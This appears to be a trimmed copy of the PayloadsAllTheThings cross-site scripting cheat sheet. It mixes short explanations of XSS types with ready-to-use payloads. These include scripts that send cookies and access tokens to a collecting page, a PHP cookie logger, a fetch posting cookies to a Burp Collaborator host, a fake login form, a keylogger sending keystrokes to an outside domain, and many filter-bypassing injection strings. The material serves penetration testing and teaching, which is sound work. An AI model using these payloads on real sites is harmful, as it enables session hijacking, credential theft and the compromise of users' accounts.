# Cross Site Scripting

> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

## Summary

- [Methodology](#methodology)
- [Proof of Concept](#proof-of-concept)
    - [Data Grabber](#data-grabber)
    - [CORS](#cors)
    - [UI Redressing](#ui-redressing)
    - [Javascript Keylogger](#javascript-keylogger)
    - [Other Ways](#other-ways)
- [Identify an XSS Endpoint](#identify-an-xss-endpoint)
    - [Tools](#tools)
- [XSS in HTML/Applications](#xss-in-htmlapplications)
    - [Common Payloads](#common-payloads)
    - [XSS using HTML5 tags](#xss-using-html5-tags)
    - [XSS using a Remote JS](#xss-using-a-remote-js)
    - [XSS in Hidden Input](#xss-in-hidden-input)
    - [XSS in Uppercase Output](#xss-in-uppercase-output)
    - [DOM Based XSS](#dom-based-xss)
    - [XSS in JS Context](#xss-in-js-context)
- [XSS in Wrappers for URI](#xss-in-wrappers-for-uri)
    - [Wrapper javascript:](#wrapper-javascript)
    - [Wrapper data:](#wrapper-data)
    - [Wrapper vbscript:](#wrapper-vbscript)
- [XSS in Files](#xss-in-files)
    - [XSS in XML](#xss-in-xml)
    - [XSS in SVG](#xss-in-svg)
    - [XSS in Markdown](#xss-in-markdown)
    - [XSS in CSS](#xss-in-css)
- [XSS in PostMessage](#xss-in-postmessage)
- [Blind XSS](#blind-xss)
    - [XSS Hunter](#xss-hunter)
    - [Other Blind XSS tools](#other-blind-xss-tools)
    - [Blind XSS endpoint](#blind-xss-endpoint)
    - [Tips](#tips)
- [Mutated XSS](#mutated-xss)
- [Labs](#labs)
- [References](#references)

## Methodology

Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.

There are 3 main types of XSS attacks:

- **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.

- **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.

- **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.

## Proof of Concept

When exploiting an XSS vulnerability, it’s more effective to demonstrate a complete exploitation scenario that could lead to account takeover or sensitive data exfiltration. Instead of simply reporting an XSS with an alert payload, aim to capture valuable data, such as payment information, personal identifiable information (PII), session cookies, or credentials.

### Data Grabber

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### UI Redressing

Leverage the XSS to modify the HTML content of the page in order to display a fake login form.

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### Javascript Keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Other Ways

More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## Identify an XSS Endpoint

This payload opens the debugger in the developer console rather than triggering a popup alert box.

```javascript
<script>debugger;</script>
```

Modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.

Better payload replacing `<script>alert(1)</script>`:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

References:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### Tools

Most tools are also suitable for blind XSS attacks:

- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## XSS in HTML/Applications

### Common Payloads

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
# PayloadsAllTheThings – XSS (MIT, source: https://github.com/swisskyrepo/PayloadsAllTheThings, trimmed to first ~200 lines)
